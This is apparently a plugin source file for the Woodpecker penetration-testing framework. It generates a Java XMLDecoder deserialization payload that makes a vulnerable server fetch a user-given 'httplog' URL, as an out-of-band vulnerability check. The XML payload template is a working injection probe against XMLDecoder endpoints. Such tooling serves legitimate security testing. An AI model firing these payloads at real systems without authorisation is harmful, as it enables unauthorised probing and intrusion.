package me.gv7.woodpecker.plugin.payloads;

import me.gv7.woodpecker.plugin.*;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public class HttplogPayloadGenerator implements IHelper {
    public String getHelperTabCaption() {
        return "httplog";
    }

    public IArgsUsageBinder getHelperCutomArgs() {
        IArgsUsageBinder argsUsageBinder = XMLDecoderPlugin.pluginHelper.createArgsUsageBinder();
        List<IArg> args = new ArrayList<IArg>();
        IArg args1 = XMLDecoderPlugin.pluginHelper.createArg();
        args1.setName("url");
        args1.setDefaultValue("http://127.0.0.1/ok");
        args1.setDescription("httplog server url");
        args1.setRequired(true);
        args.add(args1);
        argsUsageBinder.setArgsList(args);
        return argsUsageBinder;
    }

    public void doHelp(Map<String, Object> customArgs, IResultOutput resultOutput) throws Throwable {
        String url = (String)customArgs.get("url");
        String payload = String.format("<java>\n" +
                "    <new class=\"java.net.URL\">\n" +
                "        <string>%s</string>\n" +
                "        <void method=\"getContent\"/>\n" +
                "    </new>\n" +
                "</java>",url);

        resultOutput.rawPrintln("\n" + payload + "\n");
    }
}
